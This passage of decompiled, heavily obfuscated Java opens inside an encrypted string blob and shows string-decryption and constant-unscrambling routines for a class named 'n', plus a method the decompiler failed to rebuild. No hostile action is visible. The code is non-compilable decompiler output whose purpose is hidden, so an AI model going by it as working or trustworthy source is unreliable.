t\u0081\u00cb\u00ef\u00c9z\\z\u00ca\u00e4\u009d\u008a\u00f8hae\u009d\u0004M\u00ff\u00e9\u00da\u008e\u00ee\u00bdx9\u00f2\u00d7\u00e5,\u00d2QQ\u00192\u00a7\u00fa\u001f\u00e5\u008d\u00b4\u00d5V\u00fa\u0002\u00a9\u00b2\u0091u%\u00af\u00f8\u00af\u0081\u00c3%N\u001f\u008c\u00c7\u0006\u0080\u00e4\u00b2\u0001u\u00den_\u00a6\u00ac\u00c3\u00ac\u00ec^+\u0015\u00ce'ae\u008a+\u00c9D\u00e9\u00a0j\u00a1\u00d26G\u009d\u00ed\u0010\u00f9Q2\u00f8\u009d_\u00c5\u00dc\u00d1\u00fa\u001f\u00118\u00be\u00cd\u00be\u0017\u00da1\u00a3\u00e3\u00b1\u00fc\u0005\u00a3_}\u00b4\u00de\u00c6\u0092!\u00a9e8G\u00f5\u0000\u0093)\u0005\u00f4\u0084\u0083\u00bc\u00bf\u0080\u00e8e\u00e8\u00a0\u008c\u00da;r\u00a0\u00e8\u00fb\u00ea\u0005\u00dcS\u0007\u0005\u00a2\u00abYl0\u00f6`%\u00a4N\u00a1\u00d5\u00dc8\u00d0\u00f1\u008f\u008aS\u0005\u00a1\tg\u00a9q=\u00dd\u00d67\u0092x\u0097[l\u00c2,\u00e5\u00f2\u000e\u001e;\u0095\u00d1Nkc\u00ea\u00b9\u0015\u00145{M\u00a3\u009d\u0016*0h*\b\u0094\u00dd\u001f}_\t\u008d\u00060>c\u0087\tZ\u00bb\u00b9\u00c2\u00ba\u00c0\u00a8\u00ab\u000f\u00f5P4\u001e,\u00af\u00bb\u009b\u00d8\u0013\u00d3\u00c7\u00ec\r\u00a2\u00b9\u00f5\u00af\u00f9\u00b0P\u001fe\u00f6w\f\u00af|\u00e0\u00ecc\u009e\u0013\u00d7\u0014\u00a0*4\u0013\u0004\u00f6\u00c6\u0012p\u00a5-D3\u00cb\u00aa\u00df\u0085\u00ebY\u00f4\u0083\u00e43j\u0097\\&\u008b\u00cf\u0013M\u0013\u00ac\u00d4IA\u0091,M\n\u009b@i\u00ae\"\u00ad\u0081\u00a1\u008e\u00ed\u0093g\u001a\u0005\u00c8\u0086y\u0081\u00eaL\u001c\u00ff\u00ad:\u009c\u00bf\u00ef\u008en\u00e4\u00ae\u00cf\u00f7,\u00f4\u0091\u0086\u00be\u0087\u00cfW\t\u00c3\u009bO\u0087\u0016\u00c8W\u00fa\u00c4\u0014\u0013\u0092\u008b\u00dc\u00e6\u000f:\u00ea\u00f8l\u000bkj2\u00a5d\u0097\b\u00cc\u001e\u0093\u009e\u0088\u00f1*\u0007#c\u00e2\u00e7\u0002\u00a8#w\u0011*'\f\u0002\u00eaeh\u00f2&\u00d1\u001e\u00cf-Bjv`\ngg\u00c0;\u00c6\u0019\u00a7\u00157\u0003\u00e7\u00b0\u0003\u00b1\u00b5xn\u00f5vU\u00b5\u009b\u00a8od>\u00cfrt\u009c\u0090\u00fc\u0080C\u00f6\u008d\n!\u00f7\u00f8\b)\u009dV\u00db\u00b0\u0084\u0081\u001b\u00d3\u0080\u00a7\u00cf]I\u009b\u00bf_\u00eb\u0002\u00d1\u00fdjp\u00b3+fb\u00f1>GX\u0082\u000f\u0083\u00dek\u0006\n\u00aa<\u0095\u00d3\\3v\u0086\u00c8}\u00b8\u00fd\u00daT\u00f3\u00ae\u00f68\u00c6\u00d8W\u00bf\u00f8\u00ed@b\t\u00fc\u0003SuO(\u00cc\u001fz\u0091!hI\u0088`\u00b1M\u0081\u0010\u009a\u00c2\u001b\u00eaW\u00e9L>\u00b8[\u00daT\u00df\u00bfe\u00f1\u008b\u00f9\u00b3\u00fd\u00f4r\u00a5\u00dbh\r&\u0091\u00ef\u00a1\u00bfj\u00eb{\u0002\n\u0089\u00afjp\u00f5\u00acRo\u008b\u000f\u00db\u00e3\u00a1\u0085_S\u00d0\u0004\u00a8(\u00ae\u00f6\u00c4\u00cf_\u00f9r\u00d4\u00e8\u00e0\u001c\u0012\u00c2\u00ec\u00f1Y\u001b\u00f9j-)\u00d2\u000fb\u00bd\u00e6\u0088=W\u00fa\u00b4\u0004\u00ed\u0083\u0002\u00b0\u00b0]GZ\u0086\u00a8\u00acj\u00ed\u00bb\u00f2\u0006K\u00e0\u009b\u00a1\u0013\u00f79q\u001fo\u00160\u0012\u00a6\u0088\u0092\u00dc\u001e\u00cd\u0084\u00b0\u00f2u.?\u00f3\u0082I\u00a6\u0094&\u00a2\u00b7\u0012u?\u00abj\u00c0\u0010t\u00f9\u00dfm\u00b07V\u00e9&\u0012\u0091Rs\u00aa\u00d0\u009b\u00d2\u00d0\u00e6\u00ab\u00e3\u00f1V\u00fa\u00e9\u009f\t\u00f4\u00b8\u0083\u0004\"\u00a0\u00f2\u0089\u00c2r\u00e7!\u0095\u00aff\u00eahT\u00e9\u00c4Z\u00d0\u0087N*'[\u00d8\u00af\u00c1Ng\u00adv\u00a3\u00fc\u00b6@\u00b3hx\u0000\u00a1\u00a9z^2\u00dez\u009aS\u00d2\u0016\u0007\u009c,\u00e1;\u00bd\u00aaF=4\u00ae\u0090'\u001e\u0012\u0081\u00b3\u0086\u0099pV\u0082\u00fe\u008a\u00a4\u00bd\u000b\u0097\u00e4\u00ec\u00e2\u00b7\u008c\u00c7\u00a0\u0018\u00cc\u0012\u00d04\u00e1\u0001S\u00c5\u00c0\u00a8\r\u0007\u00b3\u00ff\u00f3=3_D\u001d\u0093\u00e7\\7e \u00cbn\u0095&`f\u00b4\u009f-\u009f\u00e6\u001bm\u00df\u0097\u008b\u00dc\u009c\u000e\u0087K\u00b0\u00c5\r\u00d2\u008d\u00fc\u00ebh\u00f6\u00a1\u00b8\u0013\u00a6\u00df\r\u00c6\u0018\u00a7x\u0088\u0007\u00d3\u00d2\u00d7gf\u00f8\u00d9\u00b91\u00c4\u0089*:\u008f\u000f\u00bc\u00f56\u008b\u00fe\u00d3\u00db\u00c3MM\u00f92\u00b1\u00e3R(J\u0099\u0083\rY4T\r\u00d2Oj\u00c1\u0018\u00af\u00e1\u00ed\u00f6\u00b7\u00b20\u0001\u00ac%\u00af\u00af\r\u00c6\u00bb\u00851\u000b\u00f5\u00ad\u000b;\u0080\u00ee\u00b0\u00b7\u00e68a\u00c2\\.\u009d%\u00aeq\u00da\u0013\u0092\u00e6:-\u001bv\u008e\u0011[0\u007fX1\u008c9*A\u00ce\u001c\u00ee]\u009eB\u00a0\u0087[\u00128\u0001\u0096\u009dM\u00c5aU\u00e4u\u00b8rd\u00a1\u0096\u009dW\u00e5\r\u0086r\u00d3\u0014^\u00bf\u009f\u00d9\u00a8\u00d0>\u00f8\u0011\u0082\u0005%t\u0014\u00a3c\u0092\u00b6\u00da\u00ad\u008e\u00e7\u007f\u00fe\u00c0\u0085\fU\u00e12lq.^\u00ea\u0003H\u008dt\u00c27\u0006\u0001\u00a3:K\u00c7+5id\u007f9\u00f8?\u00dcH\u009b\u009dR\u0003\u0019\u0019}\u0087\u00b2s#\u00bd9\u00d2\u0097'\u008d\u0012lNpS\u0015\t\u00ca\u00f4\u000b\u00baVk\u0007<d`\u0099\u0004`\u0091\u00d4\u00dbH\u00ba\u00e0\u00b2\u0019\u009eFU\u0087\u00fa: UeR6\u00fc\u00c2n\u00fc4`\u00ac\u00f0Ey".length();
                                                var4_7 = 24;
                                                var3_8 = -1;
lbl33:
                                                // 2 sources

                                                while (true) {
                                                    v6 = ++var3_8;
                                                    v4 = var5_5.substring(v6, v6 + var4_7);
                                                    v5 = 0;
                                                    break block42;
                                                    break;
                                                }
                                                break;
                                            }
lbl38:
                                            // 1 sources

                                            while (true) {
                                                var0_3[var6_4++] = n.a(var8_9).intern();
                                                if ((var3_8 += var4_7) < var7_6) {
                                                    var4_7 = var5_5.charAt(var3_8);
                                                    ** continue;
                                                }
                                                break block43;
                                                break;
                                            }
                                        }
                                        var8_9 = var1_1.doFinal(v4.getBytes("ISO-8859-1"));
                                        switch (v5) {
                                            default: {
                                                ** continue;
                                            }
                                            ** case 0:
lbl50:
                                            // 1 sources

                                            ** continue;
                                        }
                                    }
                                    var32_10 = new String[73];
                                    var30_11 = 0;
                                    var29_12 = var0_3[4];
                                    var31_13 = var29_12.length();
                                    var28_14 = 8;
                                    var27_15 = -1;
lbl58:
                                    // 2 sources

                                    while (true) {
                                        v7 = 105;
                                        v8 = ++var27_15;
                                        v9 = var29_12.substring(v8, v8 + var28_14);
                                        v10 = -1;
                                        break block44;
                                        break;
                                    }
lbl64:
                                    // 1 sources

                                    while (true) {
                                        var32_10[var30_11++] = v11.intern();
                                        if ((var27_15 += var28_14) < var31_13) {
                                            var28_14 = var29_12.charAt(var27_15);
                                            ** continue;
                                        }
                                        var29_12 = var0_3[0];
                                        var31_13 = var29_12.length();
                                        var28_14 = 7;
                                        var27_15 = -1;
lbl73:
                                        // 2 sources

                                        while (true) {
                                            v7 = 114;
                                            v12 = ++var27_15;
                                            v9 = var29_12.substring(v12, v12 + var28_14);
                                            v10 = 0;
                                            break block44;
                                            break;
                                        }
                                        break;
                                    }
lbl79:
                                    // 1 sources

                                    while (true) {
                                        var32_10[var30_11++] = v11.intern();
                                        if ((var27_15 += var28_14) < var31_13) {
                                            var28_14 = var29_12.charAt(var27_15);
                                            ** continue;
                                        }
                                        break block45;
                                        break;
                                    }
                                }
                                v13 = v9.toCharArray();
                                v14 = v13.length;
                                var33_16 = 0;
                                try {
                                    v15 = v7;
                                    v16 = v13;
                                    v17 = v14;
                                    if (v14 > 1) break block46;
lbl97:
                                    // 2 sources

                                    while (true) {
                                        v18 = v15;
                                        v16 = v16;
                                        v19 = v16;
                                        v20 = v15;
                                        v21 = var33_16;
                                        break;
                                    }
                                }
                                catch (RuntimeException v22) {
                                    throw n.b(v22);
                                }
                                while (true) {
                                    switch (var33_16 % 7) {
                                        case 0: {
                                            v23 = 44;
                                            break;
                                        }
                                        case 1: {
                                            v23 = 8;
                                            break;
                                        }
                                        case 2: {
                                            v23 = 97;
                                            break;
                                        }
                                        case 3: {
                                            v23 = 5;
                                            break;
                                        }
                                        case 4: {
                                            v23 = 44;
                                            break;
                                        }
                                        case 5: {
                                            v23 = 55;
                                            break;
                                        }
                                        default: {
                                            v23 = 9;
                                        }
                                    }
                                    try {
                                        v19[v21] = (char)(v19[v21] ^ (v20 ^ v23));
                                        ++var33_16;
                                        v15 = v18;
                                        if (v18 != 0) break;
                                        v18 = v15;
                                        v16 = v16;
                                        v21 = v15;
                                        v19 = v16;
                                        v20 = v15;
                                    }
                                    catch (RuntimeException v24) {
                                        throw n.b(v24);
                                    }
                                }
                            }
                            v25 = v16;
                            v17 = v17;
                            ** while (v17 > var33_16)
lbl148:
                            // 1 sources

                            v11 = new String(v25);
                            switch (v10) {
                                default: {
                                    ** continue;
                                }
                                ** case 0:
lbl155:
                                // 1 sources

                                ** continue;
                            }
                        }
                        n.h = var32_10;
                        n.J = new String[73];
                        n.M = n.r(-11656, -15995);
                        var19_17 = 4251398553420349052L;
                        var25_18 = new long[4];
                        var22_19 = 0;
                        var23_20 = var0_3[3];
                        var24_21 = var23_20.length();
                        var21_22 = 0;
                        while (true) {
                            var26_23 = var23_20.substring(var21_22, var21_22 += 8).getBytes("ISO-8859-1");
                            v26 = var25_18;
                            v27 = var22_19++;
                            v28 = ((long)var26_23[0] & 255L) << 56 | ((long)var26_23[1] & 255L) << 48 | ((long)var26_23[2] & 255L) << 40 | ((long)var26_23[3] & 255L) << 32 | ((long)var26_23[4] & 255L) << 24 | ((long)var26_23[5] & 255L) << 16 | ((long)var26_23[6] & 255L) << 8 | (long)var26_23[7] & 255L;
                            v29 = -1;
                            break block47;
                            break;
                        }
lbl173:
                        // 1 sources

                        while (true) {
                            v26[v27] = v30;
                            if (var21_22 < var24_21) ** continue;
                            var23_20 = var0_3[2];
                            var24_21 = var23_20.length();
                            var21_22 = 0;
                            while (true) {
                                var26_23 = var23_20.substring(var21_22, var21_22 += 8).getBytes("ISO-8859-1");
                                v26 = var25_18;
                                v27 = var22_19++;
                                v28 = ((long)var26_23[0] & 255L) << 56 | ((long)var26_23[1] & 255L) << 48 | ((long)var26_23[2] & 255L) << 40 | ((long)var26_23[3] & 255L) << 32 | ((long)var26_23[4] & 255L) << 24 | ((long)var26_23[5] & 255L) << 16 | ((long)var26_23[6] & 255L) << 8 | (long)var26_23[7] & 255L;
                                v29 = 0;
                                break block47;
                                break;
                            }
                            break;
                        }
lbl186:
                        // 1 sources

                        while (true) {
                            v26[v27] = v30;
                            if (var21_22 < var24_21) ** continue;
                            break block48;
                            break;
                        }
                    }
                    v30 = v28 ^ var19_17;
                    switch (v29) {
                        default: {
                            ** continue;
                        }
                        ** case 0:
lbl197:
                        // 1 sources

                        ** continue;
                    }
                }
                n.y = var25_18;
                n.O = new Integer[4];
                var11_24 = 6135810253390192567L;
                var17_25 = new long[2];
                var14_26 = 0;
                var15_27 = var0_3[1];
                var16_28 = var15_27.length();
                var13_29 = 0;
                while (true) {
                    break block49;
                    break;
                }
lbl209:
                // 1 sources

                while (true) {
                    var17_25[v31] = (((long)var18_30[0] & 255L) << 56 | ((long)var18_30[1] & 255L) << 48 | ((long)var18_30[2] & 255L) << 40 | ((long)var18_30[3] & 255L) << 32 | ((long)var18_30[4] & 255L) << 24 | ((long)var18_30[5] & 255L) << 16 | ((long)var18_30[6] & 255L) << 8 | (long)var18_30[7] & 255L) ^ var11_24;
                    if (var13_29 < var16_28) ** continue;
                    break block50;
                    break;
                }
            }
            var18_30 = var15_27.substring(var13_29, var13_29 += 8).getBytes("ISO-8859-1");
            v31 = var14_26++;
            ** while (true)
        }
        n.x = var17_25;
        n.v = new Long[2];
        n.INSTANCE = new n();
        n.b = false;
    }

    private static Throwable J(Throwable throwable) {
        return throwable;
    }

    /*
     * Exception decompiling
     */
    private static String r(int var0, int var1_1) {
        /*
         * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
         * 
         * org.benf.cfr.reader.util.ConfusedCFRException: Tried to end blocks [0[TRYBLOCK]], but top level block is 4[SWITCH]
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.processEndingBlocks(Op04StructuredStatement.java:435)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op04StructuredStatement.buildNestedBlocks(Op04StructuredStatement.java:484)
         *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op03SimpleStatement.createInitialStructuredBlock(Op03SimpleStatement.java:736)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:850)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
         *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
         *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
         *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
         *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
         *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
         *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
         *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
         *     at org.benf.cfr.reader.Main.main(Main.java:54)
         */
        throw new IllegalStateException("Decompilation failed");
    }

    private static int t(int n2, long l2) {
        Integer n3;
        block4: {
            int n4;
            block5: {
                String[] stringArray = g.R();
                n4 = n2 ^ (int)(l2 & 0x7FFFL) ^ 0xA9D;
                try {
                    try {
                        n3 = O[n4];
                        if (stringArray == null) break block4;
                        if (n3 != null) break block5;
                    }
                    catch (RuntimeException runtimeException) {
                        throw n.b(runtimeException);
                    }
                    n.O[n4] = (int)(y[n4] ^ l2);
                }
                catch (RuntimeException runtimeException) {
                    throw n.b(runtimeException);
                }
            }
            n3 = O[n4];
        }
        return n3;
    }

    private static long Z(int n2, long l2) {
        Long l3;
        block4: {
            int n3;
            block5: {
                String[] stringArray = g.R();
                n3 = (n2 ^ (int)l2 ^ 0x3AB) & Short.MAX_VALUE;
                try {
                    try {
                        l3 = v[n3];
                        if (stringArray == null) break block4;
                        if (l3 != null) break block5;
                    }
                    catch (RuntimeException runtimeException) {
                        throw n.b(runtimeException);
                    }
                    n.v[n3] = x[n3] ^ l2;
                }
                catch (RuntimeException runtimeException) {
                    throw n.b(runtimeException);
                }
            }
            l3 = v[n3];
        }
        return l3;
    }

    private static Throwable b(Throwable throwable) {
        return throwable;
    }

    private static String a(byte[] byArray) {
        int n2 = 0;
        int n3 = byArray.length;
        char[] cArray = new char[n3];
        for (int i2 = 0; i2 < n3; ++i2) {
            char c2;
            int n4 = 0xFF & byArray[i2];
            if (n4 < 192) {
                cArray[n2++] = (char)n4;
                continue;
            }
            if (n4 < 224) {
                c2 = (char)((char)(n4 & 0x1F) << 6);
                n4 = byArray[++i2];
                c2 = (char)(c2 | (char)(n4 & 0x3F));
                cArray[n2++] = c2;
                continue;
            }
            if (i2 >= n3 - 2) continue;
            c2 = (char)((char)(n4 & 0xF) << 12);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F) << 6);
            n4 = byArray[++i2];
            c2 = (char)(c2 | (char)(n4 & 0x3F));
            cArray[n2++] = c2;
        }
        return new String(cArray, 0, n2);
    }
}

